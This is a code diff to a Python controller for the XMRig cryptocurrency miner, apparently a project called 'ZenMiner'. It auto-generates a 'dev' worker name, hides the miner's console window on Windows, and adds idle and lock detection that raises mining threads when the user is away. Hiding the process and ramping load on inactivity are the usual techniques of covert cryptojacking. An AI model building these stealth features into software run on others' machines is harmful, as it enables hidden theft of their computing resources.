@@ -293,13 +293,26 @@ class XMRigController:
                 worker_auto = re.sub(r'[^0-9A-Za-z._-]', '', worker_auto)[:64]
 
                 # If a worker was explicitly passed to the method, prefer it (but still combine if desired).
-                if worker is not None and worker != '':
+                if worker is not None:
+                    # explicit worker provided (user mode)
                     cfg['pools'][0]['pass'] = worker
                 else:
-                    # keep user-specified worker but optionally append auto suffix (choose policy)
-                    # Here: prefer user given, but if you prefer auto-append uncomment next line:
-                    # cfg['pools'][0]['pass'] = f"{worker}_{worker_auto}"[:64]
-                    cfg['pools'][0]['pass'] = worker
+                    # dev mode -> auto-generate worker
+                    try:
+                        wallet_hash = hashlib.sha256(
+                            wallet.encode('utf-8')
+                        ).hexdigest()[:8]
+
+                        version = getattr(self, 'version', None) or globals().get(
+                            'VERSION', 'dev')
+                        version_s = re.sub(
+                            r'[^0-9A-Za-z._-]', '_', str(version))[:16]
+
+                        worker_auto = f"dev_{wallet_hash}_{version_s}"
+                        cfg['pools'][0]['pass'] = worker_auto
+
+                    except Exception:
+                        cfg['pools'][0]['pass'] = "dev"
             except Exception as _e:
                 # don't fail setting wallet for non-critical worker formatting errors
                 cfg['pools'][0]['pass'] = worker if worker is not None else ''
@@ -429,13 +442,26 @@ class XMRigController:
                 return False, None
 
             try:
-                # start xmrig once (single Popen)
+                popen_kwargs = {
+                    "stdout": self._xmrig_stdout,
+                    "stderr": self._xmrig_stderr,
+                    "close_fds": False,
+                }
+
+                # --- Windows: hide console window (KROK 3) ---
+                if sys.platform == "win32":
+                    startupinfo = subprocess.STARTUPINFO()
+                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                    startupinfo.wShowWindow = subprocess.SW_HIDE
+
+                    popen_kwargs["startupinfo"] = startupinfo
+                    popen_kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
+
                 self.proc = subprocess.Popen(
                     cmd,
-                    stdout=self._xmrig_stdout,
-                    stderr=self._xmrig_stderr,
-                    close_fds=False
+                    **popen_kwargs
                 )
+
                 log.info("Started xmrig (pid=%s)",
                          getattr(self.proc, "pid", None))
                 # remember target
@@ -834,13 +860,17 @@ class WalletRotator(threading.Thread):
 
 
 class AdaptiveThreadController(threading.Thread):
-    def __init__(self, controller: XMRigController, threads_map: dict):
+    def __init__(self, controller: XMRigController, threads_map: dict, idle_after_min: float, logout_after_min: float, debounce_sec: float):
         super().__init__(daemon=True)
         self.controller = controller
         self.threads_map = threads_map
         self.state = None
+        self._candidate_state = None
+        self._candidate_since = None
         self._stop = threading.Event()
-        # simple idle detection variables
+        self.idle_after_sec = float(idle_after_min) * 60.0
+        self.logout_after_sec = float(logout_after_min) * 60.0
+        self.state_debounce_sec = float(debounce_sec)
         self.last_input = time.time()
         self.idle_threshold = 60.0  # seconds to consider idle
         self._state_candidates = {}
@@ -851,48 +881,53 @@ class AdaptiveThreadController(threading.Thread):
 
     def get_state(self) -> str:
         """
-        Diagnostic version: logs locked + last_input_s so we can see
-        what Windows reports during lock/unlock transitions.
+        State decision based on:
+        - Windows lock (highest priority)
+        - idle time thresholds
+        No debounce here — debounce handled in run()
         """
         try:
+            # 1) Windows lock detection (highest priority)
             locked = False
-
-            # 1) Detect workstation lock if user_activity is available
             if HAS_USER_ACTIVITY:
                 try:
                     locked = user_activity.is_workstation_locked()
                 except Exception as e:
-                    log.debug(
-                        "user_activity.is_workstation_locked() failed: %s", e)
+                    log.debug("is_workstation_locked() failed: %s", e)
 
-            # 2) Detect last input time
+            # 2) Idle time (seconds since last input)
             try:
-                last = (
+                idle_sec = (
                     user_activity.get_last_input_seconds()
                     if HAS_USER_ACTIVITY
                     else (time.time() - self.last_input)
                 )
             except Exception as e:
                 log.debug("get_last_input_seconds() failed: %s", e)
-                last = time.time() - self.last_input
+                idle_sec = time.time() - self.last_input
 
-            # 3) Diagnostic log
             log.debug(
-                "get_state diagnostic: locked=%s last_input_s=%.1f idle_threshold=%.1f",
-                locked, last, self.idle_threshold
+                "state eval: locked=%s idle_sec=%.1f idle_after=%.1f logout_after=%.1f",
+                locked,
+                idle_sec,
+                self.idle_after_sec,
+                self.logout_after_sec
             )
 
-            # 4) Decision logic (same as before)
+            # 3) Decision tree
             if locked:
                 return 'logged_out'
-            if last < 5.0:
-                return 'active'
-            if last >= self.idle_threshold:
+
+            if idle_sec >= self.logout_after_sec:
+                return 'logged_out'
+
+            if idle_sec >= self.idle_after_sec:
                 return 'idle'
+
             return 'active'
 
         except Exception as e:
-            log.debug("get_state fallback exception: %s", e)
+            log.debug("get_state exception fallback: %s", e)
             return 'active'
 
     def run(self):
@@ -910,46 +945,55 @@ class AdaptiveThreadController(threading.Thread):
             while not self._stop.is_set():
                 st = self.get_state()
 
+                now = time.time()
+                st = self.get_state()
+
                 if st != self.state:
-                    # increment candidate counter for this observed state
-                    c = self._state_candidates.get(st, 0) + 1
-                    self._state_candidates[st] = c
-                    # reset counters for other candidate states
-                    for k in list(self._state_candidates.keys()):
-                        if k != st:
-                            self._state_candidates.pop(k, None)
-
-                    # choose required stable samples (stricter for logged_out)
-                    required = self._logged_out_debounce if st == "logged_out" else self._debounce_required
-
-                    if c >= required:
-                        log.info(
-                            "Adaptive state change: %s -> %s (stable %dx)", self.state, st, c)
-                        self.state = st
-                        self._state_candidates.pop(st, None)
-
-                        # determine target threads
-                        target = self.threads_map.get(st)
-                        if isinstance(target, float):
-                            import multiprocessing
-                            cpu = multiprocessing.cpu_count()
-                            threads = max(1, int(round(target * cpu)))
-                        else:
-                            threads = int(target)
-
-                        # try to set via API first, else restart
-                        if self.controller.set_threads_via_api(threads):
+                    # start or continue debounce window
+                    if self._candidate_state != st:
+                        self._candidate_state = st
+                        self._candidate_since = now
+                        log.debug(
+                            "Adaptive candidate state: %s (starting debounce)", st
+                        )
+                    else:
+                        elapsed = now - (self._candidate_since or now)
+                        if elapsed >= self.state_debounce_sec:
                             log.info(
-                                "Adaptive threads set via API -> %d", threads)
-                        else:
-                            log.info(
-                                "Adaptive threads API failed, restarting xmrig to apply %d threads", threads
+                                "Adaptive state change: %s -> %s (debounced %.1fs)",
+                                self.state,
+                                st,
+                                elapsed
                             )
-                            self.controller.restart(threads=threads)
+                            self.state = st
+                            self._candidate_state = None
+                            self._candidate_since = None
+
+                            # determine target threads
+                            target = self.threads_map.get(st)
+                            if isinstance(target, float):
+                                import multiprocessing
+                                cpu = multiprocessing.cpu_count()
+                                threads = max(1, int(round(target * cpu)))
+                            else:
+                                threads = int(target)
+
+                            # apply threads
+                            if self.controller.set_threads_via_api(threads):
+                                log.info(
+                                    "Adaptive threads set via API -> %d", threads
+                                )
+                            else:
+                                log.info(
+                                    "Adaptive threads API failed, restarting xmrig to apply %d threads",
+                                    threads
+                                )
+                                self.controller.restart(threads=threads)
                 else:
-                    # stable state observed — clear any pending candidates
-                    if self._state_candidates:
-                        self._state_candidates.clear()
+                    # state stable — reset candidate
+                    if self._candidate_state is not None:
+                        self._candidate_state = None
+                        self._candidate_since = None
 
                 # faster loop to react to lock/unlock quickly
                 time.sleep(1.0)
@@ -1505,6 +1549,26 @@ def build_arg_parser():
                    help='do not show tray even if available')
     p.add_argument('--http-debug', action='store_true',
                    help='enable verbose HTTP request logging (debug)')
+    p.add_argument(
+        '--idle-after-min',
+        type=float,
+        default=2.0,
+        help='Minutes of no user input after which state becomes IDLE (default: 2.0)'
+    )
+
+    p.add_argument(
+        '--logout-after-min',
+        type=float,
+        default=15.0,
+        help='Minutes of no user input after which state becomes LOGGED_OUT even if Windows does not report lock (default: 15.0)'
+    )
+
+    p.add_argument(
+        '--state-debounce-sec',
+        type=float,
+        default=10.0,
+        help='Debounce time in seconds required to confirm state change (default: 10.0)'
+    )
     return p
 
 
@@ -1543,6 +1607,9 @@ def main():
         sys.exit(2)
 
     log.info("ZenMiner starting...")
+    log.info("Adaptive timing config: idle_after=%.1f min, logout_after=%.1f min, debounce=%.1f sec",
+             args.idle_after_min, args.logout_after_min, args.state_debounce_sec)
+
     log.info("Detected VERSION: v0.0.1-CLI (modified)")
     log.info("Config loaded (dev_wallet immutable at runtime)")
     log.info("BASE_DIR (runtime): %s", os.getcwd())
@@ -1560,7 +1627,13 @@ def main():
     controller.threads_spec = args.threads
 
     # Adaptive controller
-    adaptive = AdaptiveThreadController(controller, threads_map)
+    adaptive = AdaptiveThreadController(
+        controller,
+        threads_map,
+        idle_after_min=args.idle_after_min,
+        logout_after_min=args.logout_after_min,
+        debounce_sec=args.state_debounce_sec
+    )
     adaptive.start()
 
     # Wallet rotator
